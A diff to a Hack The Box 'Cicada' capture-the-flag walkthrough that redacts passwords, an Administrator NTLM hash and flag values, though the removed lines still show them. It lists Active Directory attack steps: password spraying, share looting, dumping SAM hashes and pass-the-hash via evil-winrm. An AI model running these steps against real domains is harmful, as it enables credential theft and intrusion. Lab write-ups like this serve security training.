@@ -14,15 +14,6 @@
 
 ---
 
-## Flags
-
-| Flag | Hash |
-|---|---|
-| User | `4a2903cc34a8460722bde0a93c4dfaba` |
-| Root | `0b11e58b06894401d016f1c8db3bbffa` |
-
----
-
 ## Credentials
 
 | Account | Password | NTLM Hash | Source |
@@ -125,7 +116,7 @@ impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' |
 ### Step 3 — Password Spray
 
 ```bash
-crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
+crackmapexec smb cicada.htb -u users.txt -p '{redacted}'
 ```
 
 **Hit:** `michael.wrightson` is still using the default password.
@@ -135,23 +126,23 @@ crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
 ### Step 4 — Enumerate Users with michael.wrightson
 
 ```bash
-crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
+crackmapexec smb cicada.htb -u michael.wrightson -p '{redacted}' --users
 ```
 
-**Finding:** `david.orelious` has his password stored in his AD description field: `aRt$Lp#7t*VQ!3`
+**Finding:** `david.orelious` has his password stored in his AD description field: `{redacted}`
 
 ---
 
 ### Step 5 — Access DEV Share as david.orelious
 
 ```bash
-crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
+crackmapexec smb cicada.htb -u david.orelious -p '{redacted}' --shares
 ```
 
 DEV share accessible with david.orelious credentials.
 
 ```bash
-smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
+smbclient //cicada.htb/DEV -U 'david.orelious{redacted}'
 get Backup_script.ps1
 cat Backup_script.ps1
 ```
@@ -159,7 +150,7 @@ cat Backup_script.ps1
 **Finding in script:**
 ```powershell
 $username = "emily.oscars"
-$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$password = ConvertTo-SecureString "{redacted}" -AsPlainText -Force
 ```
 
 ---
@@ -167,12 +158,12 @@ $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
 ### Step 6 — WinRM Shell as emily.oscars
 
 ```bash
-evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
+evil-winrm -u emily.oscars -p '{redacted}' -i cicada.htb
 ```
 
 ```powershell
 type C:\Users\emily.oscars.CICADA\Desktop\user.txt
-# 4a2903cc34a8460722bde0a93c4dfaba
+# {redacted}
 ```
 
 ---
@@ -202,19 +193,19 @@ download system
 impacket-secretsdump -sam sam -system system local
 ```
 
-**Administrator NTLM hash:** `2b87e7c93a3e8a0ea4a581937016f341`
+**Administrator NTLM hash:** `{redacted}`
 
 ---
 
 ### Step 8 — Pass-the-Hash as Administrator
 
 ```bash
-evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
+evil-winrm -u Administrator -H {redacted} -i cicada.htb
 ```
 
 ```powershell
 type C:\Users\Administrator\Desktop\root.txt
-# 0b11e58b06894401d016f1c8db3bbffa
+# {redacted}
 ```
 
 ---
